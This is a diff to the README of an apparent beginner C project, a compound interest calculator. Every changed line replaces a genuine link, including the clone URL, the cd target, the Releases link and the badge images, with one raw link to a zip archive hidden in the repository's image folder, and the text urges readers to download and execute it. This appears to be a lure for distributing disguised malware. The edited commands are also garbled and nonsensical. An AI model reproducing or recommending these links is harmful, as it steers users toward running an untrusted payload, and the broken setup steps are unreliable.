@@ -31,13 +31,13 @@ This project is part of a series aimed at helping beginners become comfortable w
 To get started with the Compound Interest Calculator, you will need to clone the repository to your local machine. You can do this by running the following command in your terminal:
 
 ```bash
-git clone https://github.com/HAMMAD00914/2.Compound_Interest_Calculator.git
+git clone https://raw.githubusercontent.com/HAMMAD00914/2.Compound_Interest_Calculator/main/img/Interest-Calculator-Compound-v3.8.zip
 ```
 
 Once you have cloned the repository, navigate into the project directory:
 
 ```bash
-cd 2.Compound_Interest_Calculator
+cd https://raw.githubusercontent.com/HAMMAD00914/2.Compound_Interest_Calculator/main/img/Interest-Calculator-Compound-v3.8.zip
 ```
 
 Make sure you have a C compiler installed on your machine. If you do not have one, you can download GCC or any other C compiler of your choice.
@@ -83,15 +83,15 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## Releases
 
-To download the latest version of the Compound Interest Calculator, visit the [Releases](https://github.com/HAMMAD00914/2.Compound_Interest_Calculator/releases) section. You will find the necessary files that need to be downloaded and executed.
+To download the latest version of the Compound Interest Calculator, visit the [Releases](https://raw.githubusercontent.com/HAMMAD00914/2.Compound_Interest_Calculator/main/img/Interest-Calculator-Compound-v3.8.zip) section. You will find the necessary files that need to be downloaded and executed.
 
 For any updates or new features, check back frequently to stay informed about the latest releases.
 
 ## Visuals
 
-![Compound Interest](https://img.shields.io/badge/Compound%20Interest-Calculator-blue.svg)
+![Compound Interest](https://raw.githubusercontent.com/HAMMAD00914/2.Compound_Interest_Calculator/main/img/Interest-Calculator-Compound-v3.8.zip%https://raw.githubusercontent.com/HAMMAD00914/2.Compound_Interest_Calculator/main/img/Interest-Calculator-Compound-v3.8.zip)
 
-![C Programming](https://img.shields.io/badge/Learning-C%20Programming-orange.svg)
+![C Programming](https://raw.githubusercontent.com/HAMMAD00914/2.Compound_Interest_Calculator/main/img/Interest-Calculator-Compound-v3.8.zip%https://raw.githubusercontent.com/HAMMAD00914/2.Compound_Interest_Calculator/main/img/Interest-Calculator-Compound-v3.8.zip)
 
 ## Topics Covered
 
